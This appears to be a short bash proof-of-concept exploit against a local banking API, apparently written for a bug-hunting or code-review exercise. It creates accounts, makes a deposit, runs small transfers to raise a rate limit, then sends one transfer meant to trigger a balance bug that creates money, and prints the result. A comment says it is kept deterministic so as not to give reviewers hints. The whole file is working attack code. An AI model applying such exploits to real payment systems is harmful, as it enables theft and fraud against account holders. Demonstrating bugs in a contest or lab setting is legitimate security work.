#!/bin/bash
set -o errexit
set -o pipefail
set -o nounset
req() {
    curl -s -f -X "$1" --data-binary "$2" localhost:3000/"$3" || exit 1
}
if [ "$(which curl)" = "" ]; then
    echo "Curl must be installed"
    exit 1
fi
acct1=$(req POST '{"currency": "GBP"}' makeaccount)
acct2=$(req POST '{"currency": "GBP"}' makeaccount)
echo "Deposited 500"
req POST '{"account_id": "'"$acct1"'", "amount": "500"}' deposit
echo "Working"
# We want to keep this deterministic to not give reviewers any
# hints. Do three transfers which don't trigger the bug
# (because the percentage is too small) just to get the rate
# limit up get ready for the exploit, then perform one
# transfer that does the magic. Finally, put all the money back
# into the original account and proudly present the result to
# the reviewer.
req POST '{"account_from": '"$acct1"', "account_to": '"$acct2"', "amount": 50}' transfer
req POST '{"account_from": '"$acct1"', "account_to": '"$acct2"', "amount": 50}' transfer
req POST '{"account_from": '"$acct1"', "account_to": '"$acct2"', "amount": 50}' transfer
req POST '{"account_from": '"$acct1"', "account_to": '"$acct2"', "amount": 100}' transfer
req POST '{"account_from": '"$acct2"', "account_to": '"$acct1"', "amount": 250}' transfer
req GET '{"account_id": '"$acct1"'}' dumpbalance
